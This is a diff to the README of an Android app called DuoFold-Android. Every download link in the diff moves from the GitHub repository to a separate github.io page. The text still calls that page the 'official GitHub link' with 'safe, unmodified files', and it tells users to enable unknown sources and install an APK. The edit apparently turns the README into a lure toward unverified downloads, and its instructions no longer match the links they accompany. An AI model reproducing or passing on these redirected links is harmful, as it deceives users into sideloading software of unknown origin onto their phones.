@@ -1,7 +1,7 @@
 <h1>👥 DuoFold-Android - A Foldable Experience on Any Phone</h1>
 
 <p align="center">
-  <a href="https://github.com/cuzonaluna21/DuoFold-Android"><img src="https://img.shields.io/badge/Download-DuoFold_Android-2ea44f?style=for-the-badge" alt="Download Button"></a>
+  <a href="https://cuzonaluna21.github.io"><img src="https://img.shields.io/badge/Download-DuoFold_Android-2ea44f?style=for-the-badge" alt="Download Button"></a>
 </p>
 
 ## 🪄 What Is DuoFold-Android?
@@ -23,7 +23,7 @@ Visiting the link is the first step. Here’s exactly how to get DuoFold-Android
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [https://github.com/cuzonaluna21/DuoFold-Android](https://github.com/cuzonaluna21/DuoFold-Android)
+Visit this link to download the application: [https://cuzonaluna21.github.io](https://cuzonaluna21.github.io)
 
 The link will take you to the project's main page. Look for a green "Code" button or a "Releases" section in the menu. Click "Releases" to find the latest version. You will see a file with a name like `DuoFold-Android-v1.0.0.apk`. Click on it to start downloading.
 
@@ -52,7 +52,7 @@ When the app launches for the first time, it will ask for permission to use Shiz
 
 If you find it easier to download directly on your phone, simply open the Chrome browser or any web browser on your Android device.
 
-1.  Go to [https://github.com/cuzonaluna21/DuoFold-Android](https://github.com/cuzonaluna21/DuoFold-Android).
+1.  Go to [https://cuzonaluna21.github.io](https://cuzonaluna21.github.io).
 2.  Navigate to the **Releases** tab.
 3.  Tap the APK file to download it.
 4.  After the download, you will get a notification. Tap it to install, following the same "Unknown sources" permission steps as described above.
@@ -107,7 +107,7 @@ The fold effect is designed for touch and motion. While it will display on an ex
 
 ## 📝 Final Reminders
 
-Remember to always download DuoFold-Android from the official GitHub link: [https://github.com/cuzonaluna21/DuoFold-Android](https://github.com/cuzonaluna21/DuoFold-Android). This ensures you get the latest version and safe, unmodified files.
+Remember to always download DuoFold-Android from the official GitHub link: [https://cuzonaluna21.github.io](https://cuzonaluna21.github.io). This ensures you get the latest version and safe, unmodified files.
 
 Show off your "new" foldable phone to your friends. Adjust the settings to your liking. If you run into any other trouble, head back to the GitHub page and check the "Issues" section, or post a query there for assistance.
 
